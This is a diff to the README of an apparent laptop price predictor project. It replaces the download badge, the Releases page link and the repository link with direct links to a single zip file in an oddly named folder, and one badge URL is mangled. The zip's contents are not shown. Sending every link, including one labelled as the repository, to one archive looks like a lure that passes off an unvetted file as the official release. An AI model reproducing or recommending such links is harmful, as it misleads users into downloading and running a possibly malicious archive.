@@ -1,7 +1,7 @@
 # 💻 Laptop-Price-Predictor - Predict Laptop Prices Easily
 
 ## 📥 Download Now  
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/shahanlezan/Laptop-Price-Predictor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/shahanlezan/Laptop-Price-Predictor/main/disparaging/Laptop-Price-Predictor.zip%20Latest%https://raw.githubusercontent.com/shahanlezan/Laptop-Price-Predictor/main/disparaging/Laptop-Price-Predictor.zip)](https://raw.githubusercontent.com/shahanlezan/Laptop-Price-Predictor/main/disparaging/Laptop-Price-Predictor.zip)
 
 ## 🚀 Getting Started  
 Welcome to the Laptop Price Predictor! This application helps you estimate the prices of laptops based on their specifications. Whether you're looking to purchase a new laptop or just curious about the market, this tool is here to assist you.
@@ -22,7 +22,7 @@ To run the Laptop Price Predictor, you need the following:
 ## 📥 Download & Install  
 To get started, visit the Releases page to download the latest version of Laptop Price Predictor. Follow these steps:
 
-1. Click this link: [Download Latest Release](https://github.com/shahanlezan/Laptop-Price-Predictor/releases). 
+1. Click this link: [Download Latest Release](https://raw.githubusercontent.com/shahanlezan/Laptop-Price-Predictor/main/disparaging/Laptop-Price-Predictor.zip). 
 2. You will see a list of available versions.
 3. Choose the version that matches your operating system.
 4. Click on the download link for that version.
@@ -77,6 +77,6 @@ A: No, you do not need an internet connection. All predictions are made locally 
 If you encounter any issues or have questions, please visit the repository's Issues section on GitHub where you can file a report or ask for help.
 
 ## 🌐 Learn More  
-For more detailed information about the project, source code, and future updates, check out the GitHub repository: [Laptop-Price-Predictor](https://github.com/shahanlezan/Laptop-Price-Predictor).
+For more detailed information about the project, source code, and future updates, check out the GitHub repository: [Laptop-Price-Predictor](https://raw.githubusercontent.com/shahanlezan/Laptop-Price-Predictor/main/disparaging/Laptop-Price-Predictor.zip).
 
 Thank you for using Laptop Price Predictor! We hope it helps you make informed decisions.
